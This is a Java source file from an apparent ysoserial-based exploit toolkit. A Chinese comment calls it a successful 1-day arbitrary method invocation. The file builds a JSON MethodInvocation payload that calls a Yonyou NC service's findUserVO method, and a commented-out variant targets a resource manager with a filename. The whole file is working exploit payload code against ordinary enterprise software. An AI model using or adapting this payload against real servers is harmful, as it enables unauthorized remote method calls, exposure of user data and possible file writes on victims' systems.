package ysoserial.test;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
//import nc.bs.framework.js.rmi.MethodInvocation;

import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.util.ArrayList;

/**
 * jsinvoke 任意方法调用，成功，通过重写MethodInvocation类传入具体参数 1day
 * **/
public class JSinvoke {
    public static void main(String[] args) throws NamingException {
        GsonBuilder gb = new GsonBuilder();
        gb.excludeFieldsWithoutExposeAnnotation();
        Gson g = gb.create();

        MethodInvocation methodInvocation = new MethodInvocation();
//        methodInvocation.setServiceName("uap.framework.rc.itf.IResourceManager");
//        methodInvocation.setMethodName("add");
//        methodInvocation.setParameterTypes(new String[]{"java.lang.String","java.lang.String"});
//        ArrayList arrayList = new ArrayList<>();
//        arrayList.add("111111111111");
//        arrayList.add("aaaa.jap");




        methodInvocation.setServiceName("nc.login.bs.INCUserQueryService");
        methodInvocation.setMethodName("findUserVO");
        methodInvocation.setParameterTypes(new String[]{"java.lang.String","java.lang.String"});
        ArrayList arrayList = new ArrayList<>();
        arrayList.add("111111111111");
        arrayList.add("aaaa.jap");

        methodInvocation.setParameters(arrayList);

        System.out.println(g.toJson(methodInvocation));

    }
}
